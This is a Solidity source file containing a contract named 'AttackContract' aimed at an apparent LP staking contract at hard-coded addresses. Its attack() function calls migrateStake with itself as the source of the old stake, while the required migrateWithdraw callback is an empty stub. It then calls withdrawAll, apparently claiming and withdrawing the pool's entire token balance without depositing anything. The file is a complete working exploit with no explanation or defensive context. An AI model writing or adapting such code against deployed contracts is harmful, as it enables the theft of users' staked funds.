// SPDX-License-Identifier: UNLICENSED
// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.8.0. SEE SOURCE BELOW. !!
pragma solidity >=0.7.0 <0.9.0;

import '@openzeppelin/contracts/token/ERC20/IERC20.sol';

interface IStaxLPStaking {
    function migrateStake(address oldStaking, uint256 amount) external;

    function withdrawAll(bool claim) external;
}

contract AttackContract {
    IStaxLPStaking StaxLPStaking = IStaxLPStaking(0xd2869042E12a3506100af1D192b5b04D65137941);

    IERC20 xFraxTempleLP = IERC20(0xBcB8b7FC9197fEDa75C101fA69d3211b5a30dCD9);

    function attack() public {
        uint256 lpbalance = xFraxTempleLP.balanceOf(address(StaxLPStaking));
        StaxLPStaking.migrateStake(address(this), lpbalance);
        StaxLPStaking.withdrawAll(false);
    }

    function migrateWithdraw(
        address,
        uint256 //callback
    ) public {}
}
